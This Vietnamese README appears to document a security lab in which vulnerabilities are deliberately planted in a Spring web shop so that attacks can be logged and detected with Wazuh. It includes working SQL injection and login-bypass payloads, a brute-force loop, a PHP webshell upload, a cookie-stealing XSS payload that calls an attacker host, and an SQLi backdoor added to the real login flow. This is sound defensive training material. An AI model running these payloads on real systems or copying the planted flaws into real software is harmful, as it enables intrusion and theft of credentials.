# LAB SOC — Các lỗ hổng cố tình thêm để thu thập log & phân tích với Wazuh

> ⚠️ **Chỉ dùng trong lab/máy ảo cô lập.** Toàn bộ code trong package
> `com.proj.webprojrct.vuln` là **cố tình dính lỗi**. Không deploy ra Internet,
> không dùng cho production. Xóa package `vuln/` và `logback-spring.xml` khi không cần.

## 1. Đã thêm gì

| File | Mục đích |
|------|----------|
| `src/main/resources/logback-spring.xml` | Ghi log ra file `logs/app.log` (app) và `logs/security.log` (sự kiện bảo mật) cho Wazuh agent đọc |
| `vuln/SecurityAudit.java` | Tiện ích ghi log dạng `key=value` để Wazuh decode |
| `vuln/VulnSqlController.java` | **SQL Injection** (nối chuỗi native query) |
| `vuln/VulnAuthController.java` | **Brute Force Login** (không rate-limit, log mỗi lần thử) |
| `vuln/VulnUploadController.java` | **File Upload** (ghi ra đĩa, không kiểm tra → webshell) |
| `vuln/VulnAccessController.java` | **Broken Access Control** (chức năng admin không check quyền) |

> Broken Access Control còn có sẵn ở tầng cấu hình: `SecurityConfiguration.java`
> đang để `authorizeHttpRequests().anyRequest().permitAll()` → mọi `/admin/**` đều mở.

## 2. Log sinh ra ở đâu

- `logs/app.log` — toàn bộ log ứng dụng, gồm stacktrace `SQLException` khi SQLi.
- `logs/security.log` — chỉ sự kiện bảo mật, ví dụ:

```
2026-09-22T21:15:03.221+07:00 WARN  SECURITY event=SQLI_QUERY ip=192.168.1.50 method=GET uri="/api/v1/vuln/product?id=' OR 1=1--" ua="curl/8.0" param=id value="' OR 1=1--" sql="SELECT * FROM product WHERE id = ' OR 1=1--"
2026-09-22T21:15:03.240+07:00 ERROR SECURITY event=SQLI_ERROR ip=192.168.1.50 ... error="... syntax error at or near ..."
2026-09-22T21:16:10.001+07:00 WARN  SECURITY event=LOGIN_FAILED ip=192.168.1.50 ... username="admin@nike.com" reason=bad_password
2026-09-22T21:17:22.100+07:00 WARN  SECURITY event=FILE_UPLOAD_SUSPICIOUS ip=192.168.1.50 ... filename="shell.php" ext=php ...
2026-09-22T21:18:05.500+07:00 WARN  SECURITY event=BROKEN_ACCESS ip=192.168.1.50 ... action=delete_user target=5 actor="anonymous" role=[]
```

## 2b. Lỗ hổng đã nhúng vào ENDPOINT THẬT (realistic)

Ngoài package `vuln/`, các endpoint thật sau đã được sửa để dính lỗi:

| Kịch bản | Endpoint thật | Ghi chú |
|----------|---------------|---------|
| #1 SQLi | `GET /api/v1/products/{id}` | id là số → chạy bình thường; id có payload → nối chuỗi SQL. Sửa ở `ProductService.getProductByIdVulnerable` + `ProductController` |
| #2 Brute Force | `POST /api/v1/auth/login` | Không rate-limit; ghi `LOGIN_FAILED/LOGIN_SUCCESS` vào security.log. Sửa ở `AuthenticationController` |
| #3 Broken Access | `DELETE /api/admin/users/{id}` | `@PreAuthorize` KHÔNG hiệu lực (thiếu `@EnableMethodSecurity`) + `permitAll` → ai cũng xóa được. Log `BROKEN_ACCESS`. Sửa ở `AdminUserController` |
| #4 File Upload | `POST /reviews/add/{productId}` (field `images`) | Ghi file ra `uploads/reviews/` bằng tên gốc, không kiểm tra đuôi → webshell. Sửa ở `ReviewController` (cần đăng nhập) |

Tấn công endpoint thật:
```bash
HOST=http://<IP-web>:8080
# SQLi endpoint thật
curl "$HOST/api/v1/products/10"                       # bình thường
curl "$HOST/api/v1/products/10%20OR%201=1"            # injection số
curl "$HOST/api/v1/products/1%20UNION%20SELECT%20email,password_hash,3,4,5,6,7,8,9,10%20FROM%20users--"
# Brute force endpoint thật (LoginDTO: username/password)
for p in 123456 password admin admin123; do
  curl -s -X POST "$HOST/api/v1/auth/login" -H "Content-Type: application/json" \
       -d "{\"username\":\"admin@nike.com\",\"password\":\"$p\"}"; echo; done
# Broken access endpoint thật (không cần token)
curl -X DELETE "$HOST/api/admin/users/5"
```

## 2c. SQL Injection AUTHENTICATION BYPASS (trang đăng nhập lỗi)

Trang `GET /vuln-login` (POST `/api/v1/vuln/login-sqli`) CỐ TÌNH nối chuỗi SQL trong
câu xác thực → đăng nhập KHÔNG cần mật khẩu. File: `vuln/VulnLoginController.java`.

Gõ vào ô **Email/Username** một trong các payload (mật khẩu để tùy ý):
```
admin@example.com' --            → vào thẳng bằng admin, bỏ qua mật khẩu
' OR role='ADMIN' LIMIT 1 --     → vào bằng 1 tài khoản admin bất kỳ
' OR '1'='1' LIMIT 1 --          → vào bằng user đầu tiên trong bảng
```
Log: `event=SQLI_LOGIN_BYPASS` (kèm câu SQL bị chèn `--`) + `event=SQLI_LOGIN_SUCCESS`
(`bypassed_as_email=... role=ADMIN`).

**Bypass ngay trên trang đăng nhập THẬT** `/login` (`POST /api/v1/auth/login`):
`AuthenticationController` thử xác thực chuẩn Spring Security trước; nếu thất bại thì rơi
vào "cửa hậu" SQLi nối chuỗi (`vulnerableSqlLogin`). Vì vậy:
- Login đúng mật khẩu → đường an toàn (Spring Security) → `LOGIN_SUCCESS`.
- Brute force sai mật khẩu (không có `'`) → cửa hậu trả rỗng → `LOGIN_FAILED`.
- Payload `admin@example.com' --` → bypass → `SQLI_LOGIN_BYPASS` + `SQLI_LOGIN_SUCCESS role=ADMIN`.

Lưu ý: ô Email trang thật có `type="email"` chặn dấu `'` phía client — attacker vượt qua
bằng DevTools/Burp/tắt JS (chỉ là kiểm tra client; server vẫn dính lỗi).

## 2d. Stored XSS (đánh giá sản phẩm)

`product-detail.html` render tiêu đề/nội dung đánh giá bằng `th:utext` (KHÔNG escape)
→ mã JS lưu trong đánh giá sẽ chạy trong trình duyệt của bất kỳ ai xem sản phẩm đó.

Payload gửi vào ô nội dung đánh giá (endpoint `POST /reviews/add/{id}`):
```html
<img src=x onerror="alert(document.cookie)">
<script>fetch('http://attacker/steal?c='+document.cookie)</script>
```
- Khi nạn nhân mở trang sản phẩm → JS chạy (đánh cắp cookie không HttpOnly, thao tác thay nạn nhân, redirect, keylog…).
- JWT ở đây là HttpOnly nên `document.cookie` không lấy được token — nhưng XSS vẫn thực thi mã tùy ý.
- Log: `event=XSS_STORED productId=.. reviewId=.. payload="..."`. Wazuh bắt theo mẫu
  `<script`, `onerror=`, `<img`, `javascript:` trong payload.

## 3. Lệnh khai thác thử — endpoint LAB riêng /api/v1/vuln/* (từ Kali)

```bash
HOST=http://<IP-web>:8080

# --- SQL Injection ---
curl "$HOST/api/v1/vuln/product?id=10"                 # truy vấn bình thường
curl "$HOST/api/v1/vuln/product?id=0 OR 1=1--"         # dump toàn bộ product
curl "$HOST/api/v1/vuln/product?id='"                  # gây syntax error (log PostgreSQL)
curl "$HOST/api/v1/vuln/search?name=x' OR '1'='1"      # bypass điều kiện LIKE
# Rút dữ liệu bảng users qua UNION (chỉnh số cột cho khớp bảng product):
curl "$HOST/api/v1/vuln/product?id=1 UNION SELECT email,password_hash,3,4,5,6,7,8,9,10 FROM users--"

# --- Brute Force Login ---
for p in 123456 password admin admin123 nike2024 qwerty; do
  curl -s -X POST "$HOST/api/v1/vuln/login" -H "Content-Type: application/json" \
       -d "{\"username\":\"admin@nike.com\",\"password\":\"$p\"}"; echo;
done
# hoặc dùng hydra với http-post-form

# --- File Upload (webshell) ---
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -F "file=@shell.php" "$HOST/api/v1/vuln/upload"

# --- Broken Access Control ---
curl -X POST "$HOST/api/v1/vuln/admin/delete-user?id=5"   # không cần token vẫn chạy
```

## 4. Cấu hình PostgreSQL để có log DB (kịch bản SQLi)

Trong container `cps_postgres`, bật ghi mọi câu lệnh (chỉ để lab):

```sql
ALTER SYSTEM SET log_statement = 'all';
ALTER SYSTEM SET log_min_error_statement = 'error';
SELECT pg_reload_conf();
```
Log DB nằm ở `/var/lib/postgresql/data/log/` trong container.

## 5. Cấu hình Wazuh agent đọc log

Thêm vào `ossec.conf` của agent trên máy chạy web (đường dẫn tuyệt đối tới thư mục `logs/` của app):

```xml
<localfile>
  <log_format>syslog</log_format>
  <location>D:\TLCN_ATTT\web-attack\nike\logs\security.log</location>
</localfile>
<localfile>
  <log_format>syslog</log_format>
  <location>D:\TLCN_ATTT\web-attack\nike\logs\app.log</location>
</localfile>
```

Gợi ý rule tùy biến (SOC-server, `local_rules.xml`) — bắt theo trường `event=`:
`SQLI_ERROR`, nhiều `LOGIN_FAILED` cùng IP (T1110), `FILE_UPLOAD_SUSPICIOUS` (T1505.003),
`BROKEN_ACCESS`.

## 6. Gỡ bỏ khi xong

```bash
# Xóa package lab riêng + cấu hình log
rm -rf src/main/java/com/proj/webprojrct/vuln
rm src/main/resources/logback-spring.xml VULN_LAB_SOC.md
```
Các endpoint THẬT đã bị sửa (ProductService/ProductController, AuthenticationController,
ReviewController, AdminUserController) — hoàn tác bằng git:
```bash
git checkout -- src/main/java/com/proj/webprojrct/product/service/ProductService.java \
                src/main/java/com/proj/webprojrct/product/controller/ProductController.java \
                src/main/java/com/proj/webprojrct/auth/AuthenticationController.java \
                src/main/java/com/proj/webprojrct/review/controller/ReviewController.java \
                src/main/java/com/proj/webprojrct/admin/controller/AdminUserController.java
```
